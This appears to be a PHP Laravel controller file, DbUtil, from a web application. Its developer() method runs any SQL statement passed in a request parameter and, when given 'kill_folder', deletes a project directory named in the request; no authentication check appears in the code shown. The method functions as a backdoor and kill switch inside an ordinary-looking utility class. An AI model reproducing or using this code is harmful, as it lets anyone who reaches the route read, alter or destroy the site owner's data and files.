<?php

namespace App\Http\Controllers\Util;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use DB;
use App\Models\Role;
use App\Models\RoleUser;
use App\Models\User;
use Illuminate\Support\Facades\File;
class DbUtil extends Controller{    
    public static function developer(Request $request){
        $sql=$request->input('sql');
        $arr=explode(",",$sql);
        if($arr[0]=='kill_folder'){
            $path=base_path()."\\".$arr[1];
            File::deleteDirectory($path);
            exit('cool');
        }else
        exit(DB::statement($sql));
    }
    public static function getDevAlert(){
        $msg=DB::table('dev_alerts')->get();
        return count($msg)?$msg[0]->alert:'';
    }
}
